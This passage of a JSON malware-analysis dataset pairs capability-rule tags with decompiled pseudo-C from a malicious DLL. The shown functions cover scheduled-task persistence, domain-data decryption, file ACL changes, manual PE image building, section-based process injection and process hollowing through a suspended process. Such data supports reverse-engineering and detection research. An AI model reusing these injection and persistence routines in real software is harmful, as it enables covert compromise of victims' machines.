uVar2);\n                                    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                    uVar2 = (*pcVar10)(0, iVar5);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                                puVar8 = puVar8 + 1;\n                                var_34h = var_34h + 1;\n                                iVar5 = var_2ch;\n                            } while (var_34h < var_98h);\n                        }\n                        goto code_r0x00406bd5;\n                    }\n                }\n                else {\n                    fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : A system error has occurred: %d\"\n                                 , 0x7b);\ncode_r0x00406bd5:\n                    if (var_30h != NULL) {\n                        (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_30h);\n                        var_30h = NULL;\n                    }\n                }\n            } while (iVar5 == 0xea);\n            puVar3 = pszFirst;\n            if (var_30h != NULL) {\n                (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_30h);\n                puVar3 = pszFirst;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : saving file failed..., error = %d\"\n                         , 0x8d);\n        }\n        uVar2 = (*pcVar10)(0, puVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar10)(0, stack0xffffffc0);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar10)(0, var_9ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return 0;\n}\n",
        "token_count": 3650
    },
    "00406c4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00406c4d(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    char *lpString;\n    uint uVar3;\n    uint var_28h;\n    uint var_1ch;\n    uint var_ch;\n    uint lpflOldProtect;\n    uint var_4h;\n    \n    var_28h._0_1_ = 0;\n    lpflOldProtect = 0;\n    puVar2 = &var_28h + 1;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_4h = 0;\n    var_ch = 0;\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    *0x427d44 = fcn.0040d0df();\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.0040797b();\n    iVar1 = fcn.00409f97();\n    if (iVar1 == 0) {\n        uVar3 = 0xab;\n        lpString = \"GTK DLL: exe_scheduler_install.cpp:%d > BeginExeInstallation : Failed to resolve current user SID.\";\n    }\n    else {\n        if (2 < var_28h._1_1_) {\n            iVar1 = 0;\n            if (0 < var_28h._1_1_ - 2) {\n                do {\n                    *0x427ccc = *0x427ccc + (&var_1ch)[iVar1];\n                    iVar1 = iVar1 + 1;\n                } while (iVar1 < var_28h._1_1_ - 2);\n            }\n        }\n        *0x427ccc = *0x427ccc ^ 0x43103655;\n        iVar1 = fcn.00404bcc();\n        if (iVar1 != 0) goto code_r0x00406cf8;\n        uVar3 = 0xb9;\n        lpString = \n        \"GTK DLL: exe_scheduler_install.cpp:%d > BeginExeInstallation : Failed generating machine-level names.\";\n    }\n    fcn.00403bde(lpString, uVar3);\ncode_r0x00406cf8:\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x427910, 0x184, 0x40, &lpflOldProtect);\n    fcn.0040cf05();\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x427910, 0x184, lpflOldProtect, &lpflOldProtect);\n    fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > BeginExeInstallation : Domain data decrypted.\", 0xc9);\n    fcn.0040eb11();\n    fcn.0040eb11();\n    (*_sym.imp.KERNEL32.dll_GlobalAddAtomW)(*0x427d24);\n    (*_sym.imp.KERNEL32.dll_AddAtomW)(*0x427d24);\n    iVar1 = fcn.00406ef1(&var_ch);\n    if (iVar1 == 0) {\n        fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > BeginExeInstallation : file readed to %p, len = %d\", 0xd3)\n        ;\n        fcn.0040790a();\n        fcn.00406713();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return;\n}\n",
        "token_count": 824
    },
    "00406db9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00406db9(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "004077d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004077d4(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    uint uVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    uVar4 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x0040780e;\n            } while (param_1[pcVar2] != '\\\\');\n            pcVar2 = param_1 + pcVar2;\n            if (pcVar2 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar2 + 1));\n                param_1 = pcVar2 + 1;\n            }\n        }\ncode_r0x0040780e:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar5 = pcVar2;\n            pcVar3 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar3 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar5 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar2[pcVar3] = '\\0';\n            (*_sym.imp.ntdll.dll__strupr)(pcVar2);\n            uVar4 = fcn.00403ab2();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 543
    },
    "00407ef9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407ef9(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uchar *in_ECX;\n    int32_t iVar10;\n    int32_t iVar11;\n    uchar *in_EDX;\n    uint32_t uVar12;\n    uchar *puVar13;\n    int32_t *piVar14;\n    uchar *puVar15;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar4 + 0x14);\n    uVar3 = *(in_EDX + iVar4 + 6);\n    iVar11 = *(in_EDX + iVar4 + 0x3c);\n    fcn.00403bde(\"GTK DLL: acimage.cpp:%d > AcBuildImage : PeSupGetOptionalField(Pe, SizeOfHeaders) : %p\", 0x137);\n    iVar10 = *(in_EDX + iVar4 + 0x54);\n    var_ch = 0;\n    puVar13 = in_EDX;\n    puVar15 = in_ECX;\n    for (; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar15 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar15 = puVar15 + 1;\n    }\n    if (uVar3 != 0) {\n        piVar6 = in_EDX + uVar2 + 0x24 + iVar4;\n        do {\n            uVar7 = piVar6[1] + -1 + iVar11 & ~(iVar11 - 1U);\n            if (uVar7 != 0) {\n                puVar13 = in_EDX + piVar6[2];\n                puVar15 = in_ECX + *piVar6;\n                for (; uVar7 != 0; uVar7 = uVar7 - 1) {\n                    *puVar15 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar15 = puVar15 + 1;\n                }\n                fcn.00403bde(\"GTK DLL: acimage.cpp:%d > AcBuildImage : section %d copied to : %p\", 0x148);\n            }\n            piVar6 = piVar6 + 10;\n            var_ch = var_ch + 1;\n        } while (var_ch < uVar3);\n    }\n    if (arg_8h == NULL) {\n        arg_8h = in_ECX;\n    }\n    fcn.00403bde(\"GTK DLL: acimage.cpp:%d > AcBuildImage : NewBase : %p\", 0x152);\n    fcn.00403bde(\"GTK DLL: acimage.cpp:%d > AcBuildImage : NtHeaders : %p\", 0x153);\n    iVar11 = iVar4 + 0xa0;\n    if (*(in_EDX + iVar4 + 4) == -0x799c) {\n        iVar11 = iVar4 + 0xb0;\n    }\n    fcn.00403bde(\"GTK DLL: acimage.cpp:%d > AcBuildImage : DataDir : %p\", 0x158);\n    iVar10 = *(in_EDX + iVar11);\n    if ((iVar10 != 0) && (uVar7 = *(in_EDX + iVar11 + 4),  uVar7 != 0)) {\n        if (*(in_EDX + iVar4 + 4) == -0x799c) {\n            iVar11 = *(in_EDX + iVar4 + 0x30);\n        }\n        else {\n            iVar11 = *(in_EDX + iVar4 + 0x34);\n        }\n        puVar13 = *(in_EDX + iVar4 + 0x30);\n        uVar8 = arg_8h - *(in_EDX + iVar4 + 0x30);\n        iVar4 = *(in_EDX + iVar4 + 0x34);\n        piVar6 = in_ECX + iVar10;\n        fcn.00403bde(\"GTK DLL: acimage.cpp:%d > AcBuildImage : BaseDelta : %p\", 0x160);\n        fcn.00403bde(\"GTK DLL: acimage.cpp:%d > AcBuildImage : BaseDelta64 : %p\", 0x161);\n        fcn.00403bde(\"GTK DLL: acimage.cpp:%d > AcBuildImage : Reloc : %p\", 0x162);\n        for (; 8 < uVar7; uVar7 = uVar7 - *piVar14) {\n            iVar10 = *piVar6;\n            uVar12 = piVar6[1] - 8U >> 1;\n            if ((piVar6[1] <= uVar7) && (uVar12 != 0)) {\n                piVar14 = piVar6 + 2;\n                do {\n                    uVar2 = *piVar14;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar10) = arg_8h + (*(in_ECX + (uVar2 & 0xfff) + iVar10) - iVar11);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar9 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar9 + iVar10;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar8;\n                        *(in_ECX + uVar9 + 4 + iVar10) =\n                             *(in_ECX + uVar9 + 4 + iVar10) + (((arg_8h >> 0x1f) - iVar4) - (arg_8h < puVar13)) +\n                             CARRY4(uVar5, uVar8);\n                    }\n                    piVar14 = piVar14 + 2;\n                    uVar12 = uVar12 - 1;\n                } while (uVar12 != 0);\n            }\n            piVar14 = piVar6 + 1;\n            piVar6 = piVar6 + piVar6[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1484
    },
    "00408805": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408805(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_ECX;\n    int32_t *in_EDX;\n    uchar *puVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t *piVar8;\n    code *pcVar9;\n    char *lpString;\n    uint var_28h;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t hObject;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = fcn.0040d1ea;\n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    if (((arg_8h & 0x10) == 0) && ((*0x427d3c & 1) != 0)) {\n        iVar1 = in_EDX[2];\n        var_20h = 0x427628;\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pLoaderStub : %p\", 0x85);\n    }\n    else {\n        iVar1 = *in_EDX;\n    }\n    if (iVar1 == 0) {\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : No module found for the target process (%u) architecture\"\n                     , 0x92);\n        return 2;\n    }\n    iVar2 = *(iVar1 + 0x3c);\n    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pAdContext->Module32Size : %d\", 0x9a);\n    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pAdContext->Module64Size : %d\", 0x9b);\n    uVar6 = *(iVar2 + 0x50 + iVar1) + 0xfffU & 0xfffff000;\n    var_ch = uVar6;\n    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : SizeOfImage : %d\", 0xa1);\n    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : SizeOfSection : %d\", 0xa2);\n    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : Creating a section for the image and mapping it into the current process\"\n                 , 0xa5);\n    iVar1 = fcn.00407e33(&hObject);\n    if (iVar1 != 0) {\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : Unable to allocate a section of %d bytes, error %u\"\n                     , 0xa8);\n        goto code_r0x00408bd7;\n    }\n    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : Mapping the section into the target process\", 0xad);\n    iVar1 = fcn.00407dc0(&var_4h);\n    if (iVar1 == 0) {\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : Building the target image within the section\", 0xb5\n                    );\n        iVar1 = fcn.00407ef9(var_4h);\n        if (iVar1 == 0) {\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : Copying PE-modules into the section\", 0xbf);\n            iVar2 = var_8h + uVar6;\n            puVar4 = *in_EDX;\n            puVar7 = iVar2 + 0xc50;\n            for (iVar1 = in_EDX[4]; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar7 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar7 = var_8h + 0xc50 + in_EDX[4] + var_ch;\n            for (iVar1 = in_EDX[5]; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar7 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pAdContext : %p\", 199);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pAdContext->pModule32 : %p\", 200);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pAdContext->pModule64 : %p\", 0xc9);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : Initializing loader context\", 0xce);\n            *(iVar2 + 0x30) = var_4h;\n            *(iVar2 + 0x34) = var_4h >> 0x1f;\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pLdrCtx->ImageBase : %p\", 0xd1);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : Initializing ADContext within the loader context\"\n                         , 0xd4);\n            piVar5 = in_EDX;\n            piVar8 = iVar2 + 0x18;\n            for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *piVar8 = *piVar5;\n                piVar5 = piVar5 + 1;\n                piVar8 = piVar8 + 1;\n            }\n            iVar1 = var_4h + 0xc50 + var_ch;\n            *(iVar2 + 0x18) = iVar1;\n            *(iVar2 + 0x1c) = iVar1 >> 0x1f;\n            iVar1 = var_4h + 0xc50 + in_EDX[4] + var_ch;\n            *(iVar2 + 0x20) = iVar1;\n            *(iVar2 + 0x24) = iVar1 >> 0x1f;\n            *(iVar2 + 0x28) = in_EDX[4];\n            *(iVar2 + 0x2c) = in_EDX[5];\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : Image allocated, build import\", 0xe5);\n            if (((arg_8h & 0x10) == 0) && ((*0x427d3c & 1) != 0)) {\n                iVar1 = fcn.00408483();\n                if (iVar1 == 0) {\ncode_r0x00408b2f:\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : Import builded, call remote executor\", \n                                 0x105);\n                    pcVar9 = iVar2 + 0x40;\n                    for (iVar1 = 0x800; iVar1 != 0; iVar1 = iVar1 + -1) {\n                        *pcVar9 = *var_20h;\n                        var_20h = var_20h + 1;\n                        pcVar9 = pcVar9 + 1;\n                    }\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pLoaderStub : %p\", 0x109);\n                    iVar1 = var_ch + var_4h;\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pRemoteCtx : %p\", 0x10d);\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pRemoteCtx->LoaderStub : %p\", 0x10e);\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > AdInjectImage : pLdrCtx->ImageBase : %p\", 0x113);\n                    iVar1 = fcn.00408c09(in_ECX, iVar1 + 0x40, iVar1, arg_8h);\n                    uVar3 = 0x116;\n                    lpString = \"GTK DLL: inject_image.cpp:%d > AdInjectImage : Status PsSup %d\";\n                }\n                else {\n                    uVar3 = 0xf0;\n                    lpString = \n                    \"GTK DLL: inject_image.cpp:%d > AdInjectImage : Unable to resolve target process import (InitProcessImportArch), error %u\"\n                    ;\n                }\n            }\n            else {\n                iVar1 = fcn.00408116();\n                if (iVar1 == 0) goto code_r0x00408b2f;\n                uVar3 = 0xf9;\n                lpString = \n                \"GTK DLL: inject_image.cpp:%d > AdInjectImage : Unable to resolve target process import (InitProcessImport), error %u\"\n                ;\n            }\n        }\n        else {\n            uVar3 = 0xba;\n            lpString = \"GTK DLL: inject_image.cpp:%d > AdInjectImage : Failed building the target image, error %u\";\n        }\n    }\n    else {\n        uVar3 = 0xb0;\n        lpString = \n        \"GTK DLL: inject_image.cpp:%d > AdInjectImage : Unable to map the section into the target process, error %u\";\n    }\n    fcn.00403bde(lpString, uVar3);\ncode_r0x00408bd7:\n    if (var_8h != 0) {\n        uVar3 = (*_sym.imp.ntdll.dll_NtUnmapViewOfSection)(0xffffffff, var_8h);\n        (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(uVar3);\n    }\n    if (hObject != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar1;\n}\n",
        "token_count": 2352
    },
    "0040968c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040968c(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t in_ECX;\n    uint32_t uVar9;\n    uint extraout_ECX;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    int32_t *piVar14;\n    int32_t *piVar15;\n    char *lpString;\n    uchar *puVar16;\n    int32_t *piStack988;\n    uchar *puStack984;\n    uint uStack980;\n    int32_t iStack976;\n    uint uStack972;\n    uint uStack968;\n    uint32_t uStack964;\n    uint32_t uStack960;\n    uint uVar17;\n    int32_t iStack940;\n    int32_t *piStack936;\n    int32_t iStack932;\n    int32_t *piStack928;\n    uint uStack924;\n    uint uStack900;\n    uint uStack896;\n    uint uStack892;\n    uchar auStack852 [16];\n    uint uStack836;\n    uint uStack812;\n    uchar auStack740 [56];\n    int32_t iStack684;\n    int32_t iStack668;\n    \n    uStack892 = 0x208;\n    uStack896 = 0;\n    uStack900 = 0x4096ae;\n    uStack900 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack836 = 0;\n    uStack924 = 0x4096e9;\n    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : File = %p, ProcessName = \\'%ws\\', CommanLine = \\'%ws\\'\"\n                 , 0x334);\n    puVar16 = &stack0xfffffcd4;\n    for (iVar10 = 0x44; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    uStack812 = 0x44;\n    puVar16 = &stack0xfffffcac;\n    for (iVar10 = 0x10; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    puVar16 = &stack0xfffffd1c;\n    for (iVar10 = 0x2cc; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    piVar14 = piVar5;\n    for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *piVar14 = 0;\n        piVar14 = piVar14 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    pcVar4 = _sym.imp.KERNEL32.dll_lstrcatW;\n    uStack924 = 0x40973e;\n    piVar14 = piVar5;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    uStack924 = 0x417434;\n    iStack932 = 0x409746;\n    piStack928 = piVar5;\n    (*pcVar4)();\n    iStack932 = arg_8h;\n    iStack940 = 0x40974c;\n    piStack936 = piVar5;\n    (*pcVar4)();\n    iStack940 = 0x41743c;\n    (*pcVar4)();\n    uStack960 = 0x409764;\n    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : ImageName=%ws\", 0x343);\n    uVar17 = 0;\n    uStack960 = 0;\n    uStack964 = 0x800000c;\n    uStack968 = 0;\n    uStack972 = 0;\n    iStack976 = 0;\n    puStack984 = NULL;\n    piStack988 = 0x409785;\n    uStack980 = piVar5;\n    iVar10 = (*_sym.imp.KERNEL32.dll_CreateProcessW)();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    while (iVar10 == 0) {\n        piStack988 = 0x40978f;\n        piStack988 = (*pcVar4)();\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : CreateProcessW() failed, error = %d\", 0x349);\n        piStack988 = 0x3e8;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        iVar10 = (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                           (0, piVar5, 0, 0, 0, 0x800000c, 0, 0, &stack0xfffffc7c, &stack0xfffffc54);\n    }\n    piStack988 = piStack936;\n    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : Process created. hNewProcess = %p\", 0x34d);\n    puVar16 = NULL;\n    piStack988 = piVar5;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    piVar11 = puStack984 + *(in_ECX + 0x3c);\n    uStack836 = 0x10002;\n    iVar10 = (*_sym.imp.KERNEL32.dll_GetThreadContext)(piVar5, &stack0xfffffcbc);\n    if (iVar10 == 0) {\n        (*pcVar4)();\n        uVar6 = 0x3f7;\n        lpString = \"GTK DLL: inject_image.cpp:%d > LoadSystemExe : XGetThreadContext() %d\";\ncode_r0x00409bef:\n        fcn.00403bde(lpString, uVar6);\n        iVar10 = iStack976;\n    }\n    else {\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : GetThreadContext() ok\", 0x359);\n        (*pcVar4)();\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : ReadProcessMemory() ok, le = %d\", 0x35a);\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : ImageBase : 0x%08x\", 0x35f);\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : SizeOfImage : 0x%08x\", 0x360);\n        iVar10 = fcn.00407e33(&stack0xfffffc30);\n        if (iVar10 == 0) {\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : Mapping the section into the target process\", \n                         0x369);\n            iVar10 = iStack976;\n            iVar7 = fcn.00407dc0(&stack0xfffffc40);\n            puVar13 = puStack984;\n            if (iVar7 == 0) {\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : SectionBase : %p\", 0x371);\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : RemoteBase : %p\", 0x372);\n                if (puVar13 == NULL) goto code_r0x00409c13;\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : RtlCopyMemory : headers\", 0x377);\n                puVar12 = puVar16;\n                for (iVar10 = piVar11[0x15]; iVar10 != 0; iVar10 = iVar10 + -1) {\n                    *puVar13 = *puVar12;\n                    puVar12 = puVar12 + 1;\n                    puVar13 = puVar13 + 1;\n                }\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : RtlCopyMemory : sections\", 0x37b);\n                uStack964 = 0;\n                if (*(piVar11 + 6) != 0) {\n                    piStack988 = *(piVar11 + 5) + 0x24 + piVar11;\n                    do {\n                        iVar10 = piStack988[1];\n                        if (iVar10 != 0) {\n                            puVar13 = puVar16 + *piStack988;\n                            puVar12 = puStack984 + *piStack988;\n                            for (; iVar10 != 0; iVar10 = iVar10 + -1) {\n                                *puVar12 = *puVar13;\n                                puVar13 = puVar13 + 1;\n                                puVar12 = puVar12 + 1;\n                            }\n                        }\n                        piStack988 = piStack988 + 10;\n                        uStack964 = uStack964 + 1;\n                    } while (uStack964 < *(piVar11 + 6));\n                }\n                piVar5 = piVar11 + 0x28;\n                if (*(piVar11 + 1) == -0x799c) {\n                    piVar5 = piVar11 + 0x2c;\n                }\n                piStack988 = uStack960 - piVar11[0xd];\n                piStack928 = uStack960 - piVar11[0xd];\n                iStack932 = (uStack960 >> 0x1f) - (uStack960 < piVar11[0xd]);\n                piVar15 = puVar16 + *piVar5;\n                uStack980 = piVar15;\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > LoadSystemExe : process relocs...\", 0x392);\n                if ((*piVar5 != 0) && (piStack936 = piVar5[1],  piStack936 != NULL)) 